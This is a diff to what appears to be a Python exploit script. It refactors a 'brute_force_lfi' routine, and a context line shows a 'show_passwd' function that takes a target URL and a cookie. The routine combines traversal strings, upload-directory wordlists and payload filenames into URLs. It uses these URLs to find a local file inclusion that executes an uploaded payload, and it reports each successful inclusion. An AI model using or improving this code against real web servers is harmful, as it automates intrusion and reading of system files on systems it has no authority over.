@@ -25,7 +25,7 @@ def show_passwd(target_url, COOKIE):
 
 def brute_force_lfi(
     lfi_url_base,
-    payload_filename,
+    payload_filenames,
     success_indicator,
     failure_indicator,
     session,
@@ -34,19 +34,18 @@ def brute_force_lfi(
 
     print(f"Success indicator: {success_indicator}")
     print(f"Failure indicator: {failure_indicator}")
-    
+
     with open("upload_dir_wordlist.txt", "r") as f:
         payload_relatives = [
             line.strip() for line in f if not line.strip().startswith("#")
         ]
 
     with open("traversal_small.txt", "r") as f:
-        lfi_combis = f.read().strip().split("\n")
+        traversals = f.read().strip().split("\n")
 
     for payload_relative in payload_relatives:
-        for combi in lfi_combis:
-            for depth in range(1, 6):
-                traversal = combi * depth
+        for traversal in traversals:
+            for payload_filename in payload_filenames:
                 test_url = (
                     f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                 )
@@ -66,7 +65,7 @@ def brute_force_lfi(
                         if failure_indicator not in response.text:
                             print(f"[+] Successfully included payload: {test_url}")
                             return test_url
-                    
+
                     if success_indicator:
                         if success_indicator in response.text:
                             print(f"[+] Successfully included payload: {test_url}")
